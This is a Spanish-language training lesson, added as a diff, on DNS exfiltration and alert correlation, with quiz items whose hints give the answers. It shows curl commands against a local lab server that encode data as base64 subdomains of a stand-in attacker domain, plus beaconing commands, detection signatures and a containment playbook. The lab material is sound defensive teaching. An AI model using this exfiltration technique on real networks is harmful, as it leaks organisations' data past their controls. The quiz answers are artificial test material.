@@ -1,0 +1,70 @@
+---
+index: 2
+title: "Exfiltración DNS y correlación de alertas"
+questions:
+  - id: detection-evasion-t02-q01
+    prompt: "¿Por qué el DNS es un canal de exfiltración tan usado? Porque los firewalls casi siempre permiten DNS saliente hacia ___ (¿qué?)."
+    hint: "Cualquier servidor de la empresa o el resolver público: el puerto 53 UDP está abierto por defecto"
+    kind: text
+  - id: detection-evasion-t02-q02
+    prompt: "Exfiltra datos codificándolos en un subdominio largo (más de 30 caracteres) vía /dns. Envía la flag."
+    hint: "curl 'http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com' — base64 de los datos como subdominio"
+    kind: flag
+  - id: detection-evasion-t02-q03
+    prompt: "Como defensor, genera suficiente tráfico sospechoso para que /detect cruce 2+ alertas y marque correlated_attack. Envía la flag final."
+    hint: "Beacons sin jitter (alerta 1) + una query DNS larga (alerta CRITICAL) → /detect devuelve flag_if_detected"
+    kind: flag
+---
+
+## DNS: el túnel que nadie cerró
+
+El beacon HTTP sale por el 80/443 hacia un IP raro — bloqueable. Pero
+**DNS es obligatorio** en cualquier red: sin resolver nombres no hay
+internet. El atacante convierte el resolver en su canal:
+
+```bash
+# Datos codificados como subdominio de un dominio del atacante:
+#   <datos-en-base64>.evil.example.com
+curl -s "http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.example.com" | jq .
+```
+
+El servidor DNS autoritativo de `evil.example.com` (controlado por el
+atacante) ve la "consulta" y decodifica el subdominio: los datos ya
+salieron de la red. Herramientas reales: `dnscat2`, `iodine`, y el
+propio `nslookup` a mano.
+
+La firma del defensor: **consultas anormalmente largas** (los
+subdominios legítimos rara vez pasan de 25-30 chars), alta entropía del
+label, y volumen de consultas TXT/NULL inusual hacia un mismo dominio.
+
+## Correlación: de alertas a incidente
+
+Alertas aisladas hacen ruido. Un incidente se declara cuando varias
+señales **encajan**:
+
+```bash
+# 1. Genera la alerta de beaconing (3 beacons sin jitter):
+curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null
+curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null
+curl -s "http://127.0.0.1:18103/beacon?id=implant1&interval=5" >/dev/null
+
+# 2. Añade exfiltración DNS:
+curl -s "http://127.0.0.1:18103/dns?q=c3VjcmV0b3NvcGVyYXRpdm9zLmV2aWwuZXhhbXBsZS5jb20=" >/dev/null
+
+# 3. Correlaciona:
+curl -s http://127.0.0.1:18103/detect | jq .
+# "alerts": [FIXED_INTERVAL_BEACON, DNS_EXFIL], "correlated_attack": true
+```
+
+Esto es literalmente el trabajo diario de un SOC tier-2: el SIEM
+(Splunk, Elastic, Sentinel) dispara las reglas individuales, y el
+analista decide si **combinan** en un caso. Beaconing + DNS anómalo +
+misma ventana temporal = campaña, no coincidencia.
+
+## Playbook de contención (qué haría el defensor real)
+
+1. **Bloquear el dominio/IOCs** en el resolver (sinkhole DNS).
+2. **Poner en cuarentena el host** que beacona (EDR isolation).
+3. **Cazar retroactivamente**: ¿otros hosts consultaron ese dominio?
+   (18 meses de logs DNS hacia atrás).
+4. **Erradicar el implant** y rotar las credenciales que tocó.
